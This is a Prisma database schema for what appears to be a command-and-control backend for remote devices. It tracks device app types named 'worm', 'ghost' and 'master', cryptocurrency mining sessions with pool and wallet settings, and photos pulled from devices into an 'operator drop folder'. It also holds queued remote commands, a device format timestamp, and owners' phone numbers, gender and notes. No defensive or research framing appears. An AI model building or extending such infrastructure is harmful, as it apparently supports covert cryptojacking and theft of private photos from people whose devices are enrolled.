generator client {
  provider = "prisma-client-js"
}

datasource db {
  provider = "postgresql"
  url      = env("DATABASE_URL")
}

model User {
  id        String   @id @default(uuid())
  username  String   @unique
  passHash  String   @map("pass_hash")
  createdAt DateTime @default(now()) @map("created_at")
  devices   Device[]
  refreshTokens RefreshToken[]

  @@map("users")
}

model RefreshToken {
  id        String   @id @default(uuid())
  userId    String   @map("user_id")
  tokenHash String   @unique @map("token_hash")
  expiresAt DateTime @map("expires_at")
  revoked   Boolean  @default(false)
  createdAt DateTime @default(now()) @map("created_at")
  user      User     @relation(fields: [userId], references: [id], onDelete: Cascade)

  @@index([userId])
  @@map("refresh_tokens")
}

enum AppType {
  worm
  ghost
  master
}

enum Platform {
  ANDROID
  WINDOWS
  LINUX
  MACOS
}

enum MinerState {
  STOPPED
  STARTING
  RUNNING
  STOPPING
  ERROR
}

/// Server-issued, single-use enrollment proof (JWT jti). 30-min TTL.
model EnrollToken {
  id         String    @id @default(uuid())
  jti        String    @unique
  deviceId   String?   @map("device_id")
  consumedAt DateTime? @map("consumed_at")
  expiresAt  DateTime  @map("expires_at")
  createdAt  DateTime  @default(now()) @map("created_at")

  @@map("enroll_tokens")
}

/// One mining run on a device; lifecycle mirrors MinerState transitions.
model MiningSession {
  id         String    @id @default(uuid())
  deviceId   String    @map("device_id")
  algo       String    @default("rx/0")
  pool       String    @default("")
  wallet     String    @default("")
  threads    Int       @default(1)
  startedAt  DateTime  @default(now()) @map("started_at")
  stoppedAt  DateTime? @map("stopped_at")
  stopReason String?   @map("stop_reason")
  device     Device    @relation(fields: [deviceId], references: [id], onDelete: Cascade)

  @@index([deviceId, startedAt])
  @@map("mining_sessions")
}

model Device {
  id             String    @id @default(uuid())
  ownerId        String    @map("owner_id")
  name           String
  phone          String
  platform       Platform  @default(ANDROID)
  variant        String    @default("standard")
  appType        AppType   @default(worm) @map("app_type")
  enrollTokenHash String   @map("enroll_token_hash")
  deviceTokenHash String   @map("device_token_hash")
  /// SHA-256 digest of the random per-device credential (phase-1 path).
  credentialHash String?   @map("credential_hash")
  displayName    String?   @map("display_name")
  /// AES-256-GCM ciphertext of the E.164 phone; plaintext never persists.
  phoneEnc       String?   @map("phone_enc")
  phoneMasked    String?   @map("phone_masked")
  minerState     MinerState @default(STOPPED) @map("miner_state")
  /// Ring of recent hashrate samples (agent-reported, ≤120 entries).
  lastHashrate   Json?     @map("last_hashrate")
  status         String    @default("offline")
  gender         String    @default("")
  notes          String    @default("")
  apkVersion     String    @default("") @map("apk_version")
  stats          Json?
  formattedAt    DateTime? @map("formatted_at")
  lastSeen       DateTime  @default(now()) @map("last_seen")
  createdAt      DateTime  @default(now()) @map("created_at")
  updatedAt      DateTime  @updatedAt @map("updated_at")
  owner          User      @relation(fields: [ownerId], references: [id], onDelete: Cascade)
  commands       Command[]
  photos         DevicePhoto[]
  downloads      DownloadedFile[]
  auditEvents    AuditEvent[]
  miningSessions MiningSession[]

  @@index([ownerId])
  @@index([enrollTokenHash])
  @@index([deviceTokenHash])
  @@map("devices")
}

model Command {
  id        String    @id @default(uuid())
  deviceId  String    @map("device_id")
  type      String
  payload   Json      @default("{}")
  state     String    @default("queued")
  result    String?
  expiresAt DateTime? @map("expires_at")
  createdAt DateTime  @default(now()) @map("created_at")
  updatedAt DateTime  @updatedAt @map("updated_at")
  device    Device    @relation(fields: [deviceId], references: [id], onDelete: Cascade)

  @@index([deviceId])
  @@map("commands")
}

/// Agent-reported media inventory; hash is the dedup key, never the MediaStore id.
model DevicePhoto {
  id        String    @id @default(uuid())
  deviceId  String    @map("device_id")
  hash      String
  name      String
  category  String    @default("original")
  size      Int       @default(0)
  pulledAt  DateTime? @map("pulled_at")
  createdAt DateTime  @default(now()) @map("created_at")
  device    Device    @relation(fields: [deviceId], references: [id], onDelete: Cascade)

  @@unique([deviceId, hash])
  @@index([deviceId, category])
  @@map("device_photos")
}

/// One row per artifact landed in the operator drop folder.
model DownloadedFile {
  id        String   @id @default(uuid())
  deviceId  String   @map("device_id")
  kind      String   @default("photo")
  category  String   @default("")
  path      String
  sha256    String   @default("")
  bytes     Int      @default(0)
  createdAt DateTime @default(now()) @map("created_at")
  device    Device   @relation(fields: [deviceId], references: [id], onDelete: Cascade)

  @@index([deviceId])
  @@index([sha256])
  @@map("downloaded_files")
}

model AuditEvent {
  id        String   @id @default(uuid())
  deviceId  String   @map("device_id")
  actor     String   @default("operator")
  action    String
  detail    Json?
  createdAt DateTime @default(now()) @map("created_at")
  device    Device   @relation(fields: [deviceId], references: [id], onDelete: Cascade)

  @@index([deviceId, createdAt])
  @@map("audit_events")
}
